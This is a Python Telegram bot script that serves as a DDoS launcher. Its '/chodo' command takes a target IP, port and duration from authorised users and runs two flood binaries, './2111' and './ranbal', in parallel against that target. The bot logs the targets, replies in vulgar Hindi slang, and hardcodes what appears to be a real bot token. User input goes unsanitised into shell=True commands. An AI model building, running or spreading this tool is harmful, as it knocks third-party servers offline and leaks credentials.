import telebot
import subprocess
import datetime
import os
from threading import Thread
from keep_alive import keep_alive

keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('8086042271:AAH89ims2kDFFTHoZMHhNx7b8-0rkeDPZfY')

# Admin user IDs
admin_id = {"1210786221"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Dictionary to store the last time each user ran the /chodo command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

attack_running = False

# Function to execute commands in parallel
def run_command(command):
    subprocess.run(command, shell=True)

# Handler for /attack command
@bot.message_handler(commands=['chodo'])
def handle_attack(message):
    global attack_running

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Abhi Chudai Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer

            if time > 300:
                response = "Error: Time interval must be less than 300"
            else:
                attack_running = True  # Set the attack state to running
                try:
                    log_command(user_id, target, port, time)

                    # Run both ./2111 and ./ranbal simultaneously
                    command_2111 = f"./2111 {target} {port} {time} 800"
                    command_ranbal = f"./ranbal {target} {port} {time} 800"

                    thread_2111 = Thread(target=run_command, args=(command_2111,))
                    thread_ranbal = Thread(target=run_command, args=(command_ranbal,))

                    thread_2111.start()
                    thread_ranbal.start()

                    # Wait for both threads to complete
                    thread_2111.join()
                    thread_ranbal.join()

                    response = "Chudai completed successfully."
                except Exception as e:
                    response = f"Error during attack: {str(e)}"
                finally:
                    attack_running = False  # Reset the attack state
        else:
            response = "Usage: /chodo <target> <port> <time>"
    else:
        response = "Nhi milega GROUP per Free hai Wha use krle."

    bot.reply_to(message, response)

# Other handlers remain the same
# (e.g., /add, /remove, /clearlogs, /logs, etc.)

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
